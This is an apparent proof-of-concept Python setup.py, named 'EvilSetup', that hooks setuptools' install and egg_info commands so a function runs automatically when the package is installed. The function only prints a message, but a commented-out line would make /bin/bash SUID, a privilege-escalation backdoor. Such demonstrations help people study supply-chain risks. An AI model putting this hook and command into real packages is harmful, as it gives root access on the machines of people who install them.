from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os


def run_command():
    # os.system("chmod u+s /bin/bash")
    print("### Evil Things.")


class RunEggInfoCommand(egg_info):
    def run(self):
        run_command()
        egg_info.run(self)


class RunInstallCommand(install):
    def run(self):
        run_command()
        install.run(self)


setup(
    name="EvilSetup",
    version="0.0.1",
    license="MIT",
    packages=find_packages(),
    cmdclass={
        'install': RunInstallCommand,
        'egg_info': RunEggInfoCommand
    },
)
